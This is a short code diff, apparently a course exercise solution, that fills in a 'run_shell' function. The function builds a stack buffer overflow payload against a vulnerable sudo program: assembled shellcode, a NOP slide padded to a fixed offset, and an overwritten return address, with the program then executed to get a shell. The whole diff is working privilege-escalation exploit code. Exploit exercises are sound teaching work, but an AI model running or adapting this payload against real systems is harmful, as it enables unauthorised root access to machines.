@@ -24,8 +24,15 @@ def run_shell(path_to_sudo: str):
 
     :param path_to_sudo: The path to the vulnerable sudo program.
     """
-    # Your code goes here.
-    raise NotImplementedError()
+    shell_code = bytearray(assemble.assemble_file("./shellcode.asm"))
+    offset = 67
+    nop = 0x90
+    RA = [0xa9,0xdf,0xff,0xbf]  # Little endian.
+    for i in range(offset - len(shell_code)): 
+        shell_code.append(nop)  # Nop slide.
+    for b in RA:
+        shell_code.append(b)    # New return value.
+    os.execl(path_to_sudo, path_to_sudo, bytes(shell_code), 'whoami')
 
 
 def main(argv):
